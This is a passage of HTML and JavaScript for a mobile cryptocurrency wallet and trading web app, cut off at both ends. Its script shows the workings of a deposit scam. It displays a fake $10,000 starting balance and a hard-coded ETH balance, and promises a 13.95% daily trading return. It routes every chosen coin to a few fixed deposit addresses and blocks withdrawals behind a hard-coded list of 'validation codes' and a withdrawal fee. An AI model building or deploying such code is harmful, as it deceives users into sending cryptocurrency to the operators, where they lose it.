                            <path fill-rule="evenodd" d="M7.5 3.75A1.5 1.5 0 0 0 6 5.25v13.5a1.5 1.5 0 0 0 1.5 1.5h6a1.5 1.5 0 0 0 1.5-1.5V5.25a1.5 1.5 0 0 0-1.5-1.5h-6ZM9 6a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5H9Zm-1.5 6a.75.75 0 0 1 .75-.75h.008a.75.75 0 0 1 .75.75v.008a.75.75 0 0 1-.75.75H8.25a.75.75 0 0 1-.75-.75v-.008Zm.75 4.5a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5H8.25Z" clip-rule="evenodd" />
                            <path d="M19.333 3.393c2.254 2.254 2.254 5.241 0 7.495L16.5 13.977a1.5 1.5 0 0 0-.44 1.06V19.5c0 1.056.452 2.068 1.22 2.76l.635.572c.582.525.965 1.28.965 2.083V24H.75v-2.208c0-.803.383-1.558.965-2.083l.635-.572a3.376 3.376 0 0 0 1.22-2.76v-4.463c0-.386-.118-.76-.33-.943L2.43 9.488a.75.75 0 1 1 1.06-1.06L5.5 10.977a3.001 3.001 0 0 1 .877 2.12v4.52a.75.75 0 0 0 .75.75h6.077c.307 0 .602-.09.847-.253L16.5 16.5l2.833-2.833Z" />
                        </svg>
                        Disconnect
                    </div>
                </button>
                <button id="securityBtn" class="btn-ghost rounded-xl">
                    <div class="flex items-center gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                            <path fill-rule="evenodd" d="M12 1.5a5.25 5.25 0 0 0-5.25 5.25v3a3 3 0 0 0-3 3v6.75a3 3 0 0 0 3 3h10.5a3 3 0 0 0 3-3v-6.75a3 3 0 0 0-3-3v-3c0-2.9-2.35-5.25-5.25-5.25ZM12 4.5a3.75 3.75 0 1 0 0 7.5 3.75 3.75 0 0 0 0-7.5Z" clip-rule="evenodd" />
                        </svg>
                        Security
                    </div>
                </button>
            </div>
        </div>
    </section>

    <section id="deposit" class="page px-4 py-4 hidden-page space-y-4">
        <div id="deposit-step-1" class="space-y-4">
            <div class="flex items-center gap-3">
                <button onclick="window.showPage('home')" class="p-2 rounded-full hover:bg-white/5">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                    </svg>
                </button>
                <h2 class="text-xl font-bold">Deposit</h2>
            </div>
            <input id="coinSearchInput" type="text" placeholder="Search for a coin" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
            <div id="coinList" class="space-y-2 mt-4 max-h-[60vh] overflow-y-auto">
                <div class="text-sm text-center text-[var(--muted)] py-4">Loading coins...</div>
            </div>
        </div>

        <div id="deposit-step-2" class="hidden space-y-4">
            <div class="flex items-center gap-3">
                <button onclick="window.showDepositStep(1)" class="p-2 rounded-full hover:bg-white/5">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                    </svg>
                </button>
                <h2 class="text-xl font-bold">Select Network</h2>
            </div>
            <div id="selectedCoinInfo" class="rounded-xl p-4 bg-[var(--panel)] flex items-center gap-4"></div>
            <div class="rounded-xl p-4 bg-[var(--panel)]">
                <div class="font-semibold mb-2">Available Networks</div>
                <div class="space-y-3" id="networkList"></div>
            </div>
        </div>

        <div id="deposit-step-3" class="hidden space-y-4 text-center">
            <div class="flex items-center gap-3">
                <button onclick="window.showDepositStep(2)" class="p-2 rounded-full hover:bg-white/5">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                    </svg>
                </button>
                <h2 class="text-xl font-bold">Deposit Address</h2>
            </div>
            <div class="bg-[var(--panel)] rounded-xl p-6">
                <div id="qrCodeContainer" class="p-4 bg-white rounded-lg inline-block"></div>
                <div class="text-xs text-[var(--muted)] mt-4">Selected Network</div>
                <div id="selectedNetworkInfo" class="text-sm font-semibold"></div>
                <div id="depositAddressText" class="break-all font-mono text-xs mt-1"></div>
                <p class="safe-note mt-4">Only send <span id="depositCoinSymbol"></span> to this address. Sending other assets may result in permanent loss.</p>
                <button onclick="window.copyAddress()" class="btn-ghost mt-4 w-full">Copy Address</button>
            </div>
        </div>
    </section>
    
    <section id="send" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <div class="flex items-center justify-between mb-3">
                <h2 class="font-semibold">Send Funds</h2>
                <button onclick="window.showPage('home')" class="text-sm text-[var(--muted)]">Back</button>
            </div>
            
            <div id="sendForm" class="grid gap-4 mt-3">
                <div class="flex flex-col gap-2">
                    <label for="sendAddress" class="text-sm text-[var(--muted)]">Recipient Address:</label>
                    <input type="text" id="sendAddress" placeholder="Enter address" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                </div>
                <div class="flex flex-col gap-2">
                    <label for="sendNetwork" class="text-sm text-[var(--muted)]">Select Network:</label>
                    <select id="sendNetwork" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                        <option value="BTC">Bitcoin [BTC]</option>
                        <option value="ETH">Ethereum [ERC-20]</option>
                        <option value="BSC">BNB Smart Chain [BEP20]</option>
                        <option value="TRC">Tron [TRC-20]</option>
                    </select>
                </div>
                <div class="flex flex-col gap-2">
                    <label for="sendAmount" class="text-sm text-[var(--muted)]">Amount:</label>
                    <input type="number" id="sendAmount" placeholder="Enter amount" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                </div>
                <p class="safe-note mt-1">Withdrawal fee: ~0.19 (BNB/ETH/etc. depending on network)</p>

                <button id="sendConfirmBtn" class="btn-primary rounded-xl">Confirm Send</button>
                <p id="sendStatus" class="text-sm text-center text-[var(--muted)]"></p>
            </div>

            <div id="sendValidationSection" class="hidden grid gap-4 mt-4">
                <div class="flex flex-col gap-2">
                    <label for="validationCode" class="text-sm text-[var(--muted)]">Enter Validation Code:</label>
                    <input type="text" id="validationCode" placeholder="Enter code" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                </div>
                <button id="validateCodeBtn" class="btn-primary rounded-xl">Submit Code</button>
                <p id="validationStatus" class="text-sm text-center text-[var(--muted)]"></p>
            </div>
        </div>
    </section>
    
    <section id="transfer" class="page px-4 py-4 hidden-page space-y-4">
        <div class="rounded-2xl p-5 bg-[var(--panel)]">
            <h2 class="font-semibold mb-3">Transfer Funds</h2>
            <div class="grid gap-4 mt-3">
                <div class="flex flex-col gap-2">
                    <label for="transferAmount" class="text-sm text-[var(--muted)]">Amount:</label>
                    <input type="number" id="transferAmount" placeholder="Enter amount" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                </div>
                <div class="flex flex-col gap-2">
                    <label for="transferDirection" class="text-sm text-[var(--muted)]">Direction:</label>
                    <select id="transferDirection" class="w-full px-4 py-3 rounded-xl bg-[var(--panel-2)] border border-white/10 focus:outline-none focus:border-[var(--brand)] transition-colors">
                        <option value="toTrade">Transfer to Trade Account</option>
                        <option value="toMain">Transfer to Main Wallet</option>
                    </select>
                </div>
                <button id="transferBtn" class="btn-primary rounded-xl">Transfer</button>
                <p id="transferStatus" class="text-sm text-center text-[var(--muted)]"></p>
                <button onclick="window.showPage('trade')" class="btn-ghost rounded-xl">Back</button>
            </div>
        </div>
    </section>

</main>

<nav class="h-16 border-t border-white/5 bg-[var(--panel)] grid grid-cols-5 text-center text-xs">
    <button data-tab="home" onclick="window.showPage('home')" class="tab py-3 tab-active">
        <div class="flex flex-col items-center">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                <path d="M11.47 3.864a.75.75 0 0 0-1.06 0l-7.5 7.5a.75.75 0 0 0 1.06 1.06l6.22-6.22V21a.75.75 0 0 0 1.5 0V6.204l6.22 6.22a.75.75 0 1 0 1.06-1.06l-7.5-7.5Z" />
            </svg>
            Home
        </div>
    </button>
    <button data-tab="discover" onclick="window.showPage('discover')" class="tab py-3">
        <div class="flex flex-col items-center">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                <path d="M10.875 18.75a.75.75 0 0 0 .75-1.5H6.75a.75.75 0 0 0-.75.75v3a.75.75 0 0 0 .75.75h3a.75.75 0 0 0 .75-.75v-3ZM6 18.75a.75.75 0 0 1-.75.75H3a.75.75 0 0 1-.75-.75v-3a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 .75.75v3ZM18.75 10.875a.75.75 0 0 0 .75-1.5H15a.75.75 0 0 0-.75.75v3a.75.75 0 0 0 .75.75h3a.75.75 0 0 0 .75-.75v-3ZM15 10.875a.75.75 0 0 1 .75.75v3a.75.75 0 0 1-.75.75h-3a.75.75 0 0 1-.75-.75v-3a.75.75 0 0 1 .75-.75h3ZM6.75 10.875a.75.75 0 0 0 .75-1.5H3a.75.75 0 0 0-.75.75v3a.75.75 0 0 0 .75.75h3a.75.75 0 0 0 .75-.75v-3ZM15.75 6.75a.75.75 0 0 0-.75.75v3a.75.75 0 0 0 .75.75h3a.75.75 0 0 0 .75-.75v-3a.75.75 0 0 0-.75-.75h-3ZM10.875 6a.75.75 0 0 0 .75-1.5h-3a.75.75 0 0 0-.75.75v3a.75.75 0 0 0 .75.75h3a.75.75 0 0 0 .75-.75v-3ZM15.75 3a.75.75 0 0 0-.75.75v3a.75.75 0 0 0 .75.75h3a.75.75 0 0 0 .75-.75v-3a.75.75 0 0 0-.75-.75h-3Z" />
            </svg>
            Discover
        </div>
    </button>
    <button data-tab="trade" onclick="window.showPage('trade')" class="tab py-3">
        <div class="flex flex-col items-center">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                <path fill-rule="evenodd" d="M12 2.25c-5.385 0-9.75 4.365-9.75 9.75s4.365 9.75 9.75 9.75 9.75-4.365 9.75-9.75S17.385 2.25 12 2.25Zm-3.75 6a.75.75 0 0 0-1.5 0v1.5a.75.75 0 0 0 1.5 0V8.25Zm4.5 0a.75.75 0 0 0-1.5 0v5.25a.75.75 0 0 0 1.5 0V8.25Zm5.25 0a.75.75 0 0 0-1.5 0v8.25a.75.75 0 0 0 1.5 0V8.25Z" clip-rule="evenodd" />
            </svg>
            Trade
        </div>
    </button>
    <button data-tab="memes" onclick="window.showPage('memes')" class="tab py-3">
        <div class="flex flex-col items-center">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                <path fill-rule="evenodd" d="M1.5 6a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75h-1.5A.75.75 0 0 1 1.5 7.5v-1.5ZM5.25 6a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75h-1.5a.75.75 0 0 1-.75-.75v-1.5ZM9 6a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75H9a.75.75 0 0 1-.75-.75v-1.5ZM1.5 10.5a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75h-1.5a.75.75 0 0 1-.75-.75v-1.5ZM5.25 10.5a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75h-1.5a.75.75 0 0 1-.75-.75v-1.5ZM9 10.5a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75H9a.75.75 0 0 1-.75-.75v-1.5ZM1.5 15a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75h-1.5a.75.75 0 0 1-.75-.75v-1.5ZM5.25 15a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75h-1.5a.75.75 0 0 1-.75-.75v-1.5ZM9 15a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75H9a.75.75 0 0 1-.75-.75v-1.5ZM1.5 19.5a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75h-1.5a.75.75 0 0 1-.75-.75v-1.5ZM5.25 19.5a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75h-1.5a.75.75 0 0 1-.75-.75v-1.5ZM9 19.5a.75.75 0 0 1 .75-.75h1.5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-.75.75H9a.75.75 0 0 1-.75-.75v-1.5Z" clip-rule="evenodd" />
            </svg>
            Meme
        </div>
    </button>
    <button data-tab="settings" onclick="window.showPage('settings')" class="tab py-3">
        <div class="flex flex-col items-center">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6">
                <path d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18ZM8.25 10.5a.75.75 0 0 0 0 1.5h7.5a.75.75 0 0 0 0-1.5h-7.5Zm0 3a.75.75 0 0 0 0 1.5h7.5a.75.75 0 0 0 0-1.5h-7.5Z" />
            </svg>
            Settings
        </div>
    </button>
</nav>

<button id="installBtn" class="fixed bottom-20 right-4 btn-primary rounded-full px-5 py-3 hidden">
    Install App
</button>

<div id="searchSheet" class="fixed inset-0 hidden bg-black/60 z-40 flex items-end">
    <div class="w-full bg-[var(--panel)] rounded-t-2xl p-4">
        <div class="flex items-center justify-between mb-2">
            <div class="font-semibold">Search coins</div>
            <button class="text-sm" onclick="window.toggleSearch(false)">Close</button>
        </div>
        <input id="searchInput" class="w-full px-3 py-3 rounded-lg bg-[var(--panel-2)]" placeholder="Type a symbol or name" />
        <div id="searchResults" class="mt-3 max-h-72 overflow-auto divide-y divide-white/5"></div>
    </div>
</div>

<div id="walletModal" class="fixed inset-0 hidden bg-black/60 z-40 flex items-center justify-center">
    <div class="w-[92%] max-w-md bg-[var(--panel)] rounded-2xl p-5">
        <h3 class="font-semibold mb-2">Connected Wallet</h3>
        <div class="text-xs text-[var(--muted)]">Address</div>
        <div id="walletAddr" class="font-mono break-all">‚Äî</div>
        <div class="mt-2 text-xs text-[var(--muted)]">User ID</div>
        <div id="userIdDisplay" class="font-mono break-all">‚Äî</div>
        <div class="mt-4 flex gap-2">
            <button class="btn-ghost rounded-xl" onclick="window.closeWalletModal()">Close</button>
        </div>
    </div>
</div>

<script>
    let mainWalletBalance = 10000.00; // Starting balance
    let tradeWalletBalance = 0.00;
    let tradeEarnings = 0.00;
    let tradeInterval;
    let tradeDailyPercent = 13.95 / 100;
    
    // Send / Withdraw Logic
    const validCodes = ["483921", "175064", "902718", "634285", "217509", "856430", "490127", "731694", "562803", "308417", "941256", "128374", "675820", "203519", "487960", "819432", "356701", "740528", "612947", "098135", "573864", "284691", "160738", "495260", "837514", "021693", "658407", "794135", "320586", "946172"];
    let sendAttempts = 0;
    let sendSuspended = false;
    let currentWallet = null;

    // Helper function to get an element by ID
    const get = (id) => document.getElementById(id);

    // Modal and Page Management
    function showModal(title, message) {
        document.getElementById('modalTitle').textContent = title;
        document.getElementById('modalMessage').textContent = message;
        document.getElementById('modal').classList.remove('hidden');
    }

    function hideModal() {
        document.getElementById('modal').classList.add('hidden');
    }

    function showPage(id) {
        const pages = ['landing', 'loading', 'home', 'discover', 'trade', 'trade-chart', 'swap', 'memes', 'settings', 'deposit', 'send', 'transfer'];
        pages.forEach(p => {
            const el = document.getElementById(p);
            if (el) {
                el.classList.toggle('hidden-page', p !== id);
            }
        });

        document.querySelectorAll('nav .tab').forEach(t => {
            t.classList.toggle('tab-active', t.dataset.tab === id);
        });

        if (id === 'home') {
            renderTV('tv_chart', 'BINANCE:BTCUSDT');
            loadMovers();
        }
        if (id === 'trade') {
            renderTV('tradeChart', 'BINANCE:BTCUSDT');
            loadTradeAssets();
        }
        if (id === 'discover') loadDiscover();
        if (id === 'memes') loadMemes();
        if (id === 'settings') updateAccountWalletInfo();
        if (id === 'swap') loadSwapAssets();
    }

    function updateHomeBalance() {
        document.getElementById('totalBalance').innerText = '$' + mainWalletBalance.toFixed(2);
    }

    function updateWalletUI(address) {
        currentWallet = address;
        const accountId = generateAccountId();
        document.getElementById('netTag').textContent = `Connected`;
        document.getElementById('accountId').textContent = accountId;
        document.getElementById('homeAccountId').textContent = accountId;
        document.getElementById('walletAddr').textContent = address;
        document.getElementById('userIdDisplay').textContent = accountId;
        updateHomeBalance();
        updateAccountWalletInfo();
    }
    
    function generateAccountId() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let result = '';
        for (let i = 0; i < 10; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    async function updateAccountWalletInfo() {
        if (currentWallet) {
            get('accountWalletAddress').innerText = currentWallet;
            try {
                get('accountWalletBalance').innerText = '1.2345 ETH';
            } catch (error) {
                console.error("Failed to get balance:", error);
                get('accountWalletBalance').innerText = 'N/A';
            }
        } else {
            get('accountWalletAddress').innerText = 'Not connected';
            get('accountWalletBalance').innerText = '0 ETH';
        }
    }

    function openWalletModal() {
        document.getElementById('walletModal').classList.remove('hidden');
    }

    function closeWalletModal() {
        document.getElementById('walletModal').classList.add('hidden');
    }

    function copyText(txt) {
        navigator.clipboard.writeText(txt).then(() => showModal('Copied!', 'Address copied to clipboard.'));
    }

    function toggleSearch(open) {
        document.getElementById('searchSheet').classList.toggle('hidden', !open);
    }

    window.showModal = showModal;
    window.hideModal = hideModal;
    window.showPage = showPage;
    window.updateWalletUI = updateWalletUI;
    window.openWalletModal = openWalletModal;
    window.closeWalletModal = closeWalletModal;
    window.copyText = copyText;
    window.toggleSearch = toggleSearch;
    window.updateAccountWalletInfo = updateAccountWalletInfo;

    // PWA Install Logic
    let deferredPrompt = null;
    const installBtn = document.getElementById('installBtn');
    window.addEventListener('beforeinstallprompt', (e) => {
        e.preventDefault();
        deferredPrompt = e;
        installBtn.classList.remove('hidden');
    });

    installBtn.addEventListener('click', async () => {
        if (!deferredPrompt) {
            showModal('Install App', 'Use your browser menu to "Add to Home Screen" or install.');
            return;
        }
        deferredPrompt.prompt();
        await deferredPrompt.userChoice;
        deferredPrompt = null;
        installBtn.classList.add('hidden');
    });

    document.getElementById('getAppBtn').addEventListener('click', () => {
        if (deferredPrompt) installBtn.classList.remove('hidden');
        else showModal('Install App', 'Use your browser menu to "Add to Home Screen" or install.');
    });

    // TradingView widgets
    function renderTV(containerId, symbol) {
        if (!window.TradingView) {
            console.error("TradingView or container element is not available.");
            return;
        }
        new TradingView.widget({
            autosize: true,
            symbol: symbol,
            interval: '60',
            timezone: 'Etc/UTC',
            theme: 'dark',
            style: '1',
            locale: 'en',
            toolbar_bg: '#0d0f14',
            hide_side_toolbar: false,
            container_id: containerId
        });
    }

    // CoinGecko Data
    const cgHeaders = { 'accept': 'application/json' };
    async function loadMarket() {
        const list = document.getElementById('marketList');
        list.innerHTML = '<div class="py-6 text-center text-sm text-[var(--muted)]">Loading‚Ä¶</div>';
        try {
            const r = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false', { headers: cgHeaders });
            const data = await r.json();
            list.innerHTML = data.map(c => {
                const ch = (c.price_change_percentage_24h || 0).toFixed(2);
                const up = ch >= 0;
                return `<div class="flex items-center justify-between py-3">
                    <div class="flex items-center gap-3">
                        <img src="${c.image}" class="w-7 h-7 rounded-full" alt="${c.symbol}">
                        <div>
                            <div class="font-semibold text-sm">${c.name}</div>
                            <div class="text-[11px] text-[var(--muted)]">${c.symbol.toUpperCase()}</div>
                        </div>
                    </div>
                    <div class="text-right">
                        <div class="font-semibold">$${c.current_price.toLocaleString()}</div>
                        <div class="text-[11px] ${up ? 'text-[var(--accent)]' : 'text-[var(--danger)]'}">${up ? '+' : ''}${ch}%</div>
                    </div>
                </div>`;
            }).join('');
        } catch (e) {
            list.innerHTML = '<div class="py-6 text-center text-sm text-[var(--muted)]">Failed to load market data.</div>';
        }
    }

    async function loadMovers() {
        const list = document.getElementById('moversList');
        list.innerHTML = '<div class="py-4 text-center text-sm text-[var(--muted)]">Loading‚Ä¶</div>';
        try {
            const r = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1&sparkline=false', { headers: cgHeaders });
            const data = (await r.json()).sort((a, b) => Math.abs(b.price_change_percentage_24h || 0) - Math.abs(a.price_change_percentage_24h || 0)).slice(0, 8);
            list.innerHTML = data.map(c => {
                const ch = (c.price_change_percentage_24h || 0).toFixed(2);
                const up = ch >= 0;
                return `<div class="flex items-center justify-between py-3">
                    <div class="flex items-center gap-3">
                        <img src="${c.image}" class="w-7 h-7 rounded-full" alt="${c.symbol}">
                        <div class="font-semibold text-sm">${c.name}</div>
                    </div>
                    <div class="text-right">
                        <div class="font-semibold">$${c.current_price.toLocaleString()}</div>
                        <div class="text-[11px] ${up ? 'text-[var(--accent)]' : 'text-[var(--danger)]'}">${up ? '+' : ''}${ch}%</div>
                    </div>
                </div>`;
            }).join('');
        } catch (e) {
            list.innerHTML = '<div class="py-4 text-center text-sm text-[var(--muted)]">Failed to load.</div>';
        }
    }

    async function loadDiscover() {
        const box = document.getElementById('discoverFeed');
        box.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Loading‚Ä¶</div>';
        try {
            const g = await (await fetch('https://api.coingecko.com/api/v3/global', { headers: cgHeaders })).json();
            const t = await (await fetch('https://api.coingecko.com/api/v3/search/trending', { headers: cgHeaders })).json();
            const mcap = g.data.total_market_cap.usd.toLocaleString();
            const dom = g.data.market_cap_percentage;
            const domPairs = Object.keys(dom).slice(0, 6).map(k => `${k.toUpperCase()}: ${dom[k].toFixed(1)}%`).join(' ¬∑ ');
            const trending = t.coins.map(x => x.item).slice(0, 10).map(i => `<div class="flex items-center gap-3"><img class="w-6 h-6" src="${i.small}"><div class="text-sm">${i.name} <span class="text-[11px] text-[var(--muted)]">${i.symbol}</span></div></div>`).join('');
            box.innerHTML = `
                <div class="rounded-xl p-4 bg-[var(--panel-2)]">
                    <div class="text-xs text-[var(--muted)]">Global Market Cap</div>
                    <div class="text-xl font-bold">$${mcap}</div>
                    <div class="text-[11px] text-[var(--muted)] mt-1">Dominance ¬∑ ${domPairs}</div>
                </div>
                <div class="rounded-xl p-4 bg-[var(--panel-2)]">
                    <div class="font-semibold mb-2">Trending</div>
                    <div class="grid grid-cols-2 gap-3">${trending}</div>
                </div>`;
        } catch (e) {
            box.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Failed to load discover.</div>';
        }
    }

    async function loadMemes() {
        const list = document.getElementById('memeList');
        list.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Loading‚Ä¶</div>';
        try {
            const t = await (await fetch('https://api.coingecko.com/api/v3/search/trending', { headers: cgHeaders })).json();
            list.innerHTML = t.coins.map(x => x.item).map(i =>
                `<div class='flex items-center justify-between rounded-xl p-3 bg-[var(--panel-2)]'>
                    <div class='flex items-center gap-3'>
                        <img class='w-8 h-8' src='${i.small}'/>
                        <div class='text-sm'>${i.name}<div class='text-[11px] text-[var(--muted)]'>${i.symbol}</div></div>
                    </div>
                    <div class='text-[11px] text-[var(--muted)]'>Rank ${i.market_cap_rank || '-'}</div>
                </div>`
            ).join('');
        } catch (e) {
            list.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Failed to load trending.</div>';
        }
    }

    // Search modal
    document.getElementById('searchOpen').addEventListener('click', () => window.toggleSearch(true));
    document.getElementById('searchOpen2').addEventListener('click', () => window.toggleSearch(true));
    document.getElementById('searchInput').addEventListener('input', async (e) => {
        const q = e.target.value.trim();
        const box = document.getElementById('searchResults');
        if (!q) {
            box.innerHTML = '';
            return;
        }
        try {
            const r = await (await fetch('https://api.coingecko.com/api/v3/search?query=' + encodeURIComponent(q), { headers: cgHeaders })).json();
            box.innerHTML = r.coins.slice(0, 20).map(c => `<div class='py-2 flex items-center gap-3'>
                <img class='w-5 h-5' src='${c.thumb}'/>
                <div class='text-sm'>${c.name} <span class='text-[11px] text-[var(--muted)]'>${c.symbol}</span></div>
            </div>`).join('');
        } catch {
            box.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Failed.</div>';
        }
    });

    // Deposit Logic
    const depositAddresses = {
        'btc': { network: 'Bitcoin (BTC)', address: 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu' },
        'eth': { network: 'Ethereum (ERC-20)', address: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130' },
        'bnb': { network: 'BNB Smart Chain (BEP20)', address: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130' },
        'trx': { network: 'Tron (TRC-20)', address: 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco' }
    };

    let allCoins = [];
    let selectedCoin = null;

    async function loadCoinList() {
        const listContainer = document.getElementById('coinList');
        listContainer.innerHTML = '<div class="text-sm text-center text-[var(--muted)] py-4">Loading coins...</div>';
        try {
            const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&per_page=250&page=1&sparkline=false');
            allCoins = await res.json();
            allCoins.sort((a, b) => a.name.localeCompare(b.name));
            renderCoinList(allCoins);
        } catch (e) {
            listContainer.innerHTML = '<div class="text-sm text-center text-[var(--muted)] py-4">Failed to load coins.</div>';
        }
    }

    function renderCoinList(coins) {
        const listContainer = document.getElementById('coinList');
        if (coins.length === 0) {
            listContainer.innerHTML = '<div class="text-sm text-center text-[var(--muted)] py-4">No coins found.</div>';
            return;
        }
        listContainer.innerHTML = coins.map(c => `
            <button onclick="window.selectCoin('${c.id}', '${c.image}', '${c.name}', '${c.symbol}')" class="flex items-center gap-4 p-3 rounded-xl hover:bg-white/5 transition-colors w-full">
                <img src="${c.image}" class="w-8 h-8 rounded-full" onerror="this.onerror=null;this.src='https://placehold.co/32x32/1ea7fd/fff?text=?'"/>
                <div class="flex-1 text-left">
                    <div class="font-semibold text-sm">${c.name}</div>
                    <div class="text-xs text-[var(--muted)]">${c.symbol.toUpperCase()}</div>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[var(--muted)]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
                </svg>
            </button>
        `).join('');
    }

    function startDepositFlow() {
        showDepositStep(1);
        loadCoinList();
    }

    function showDepositStep(step) {
        document.getElementById('deposit-step-1').classList.add('hidden');
        document.getElementById('deposit-step-2').classList.add('hidden');
        document.getElementById('deposit-step-3').classList.add('hidden');
        document.getElementById(`deposit-step-${step}`).classList.remove('hidden');
    }

    function selectCoin(id, image, name, symbol) {
        selectedCoin = { id, image, name, symbol: symbol.toUpperCase() };
        document.getElementById('selectedCoinInfo').innerHTML = `
            <img src="${selectedCoin.image}" class="w-10 h-10 rounded-full" onerror="this.onerror=null;this.src='https://placehold.co/40x40/1ea7fd/fff?text=?'"/>
            <div>
                <div class="font-semibold">${selectedCoin.name}</div>
                <div class="text-sm text-[var(--muted)]">${selectedCoin.symbol}</div>
            </div>
        `;
        renderNetworkList();
        showDepositStep(2);
    }

    function renderNetworkList() {
        const networkList = document.getElementById('networkList');
        networkList.innerHTML = '';
        const networks = ['btc', 'eth', 'bnb', 'trx'];
        networks.forEach(key => {
            const net = depositAddresses[key];
            if (net) {
                const button = document.createElement('button');
                button.className = 'flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-colors w-full';
                button.onclick = () => selectNetwork(key);
                button.innerHTML = `
                    <div class="flex items-center gap-3">
                        <img src="https://via.placeholder.com/24/1ea7fd/fff?text=${key.toUpperCase()}" class="w-6 h-6 rounded-full" />
                        <div class="font-semibold text-sm">${net.network}</div>
                    </div>
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[var(--muted)]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
                    </svg>
                `;
                networkList.appendChild(button);
            }
        });
    }

    function selectNetwork(key) {
        const net = depositAddresses[key];
        const addr = net.address;
        const qrContainer = document.getElementById('qrCodeContainer');
        qrContainer.innerHTML = '';
        new QRCode(qrContainer, addr);
        document.getElementById('selectedNetworkInfo').textContent = net.network;
        document.getElementById('depositAddressText').textContent = addr;
        document.getElementById('depositCoinSymbol').textContent = selectedCoin.symbol;
        showDepositStep(3);
    }

    function copyAddress() {
        const addr = document.getElementById('depositAddressText').textContent;
        window.copyText(addr);
    }

    window.startDepositFlow = startDepositFlow;
    window.showDepositStep = showDepositStep;
    window.selectCoin = selectCoin;
    window.copyAddress = copyAddress;

    document.getElementById('coinSearchInput').addEventListener('input', (e) => {
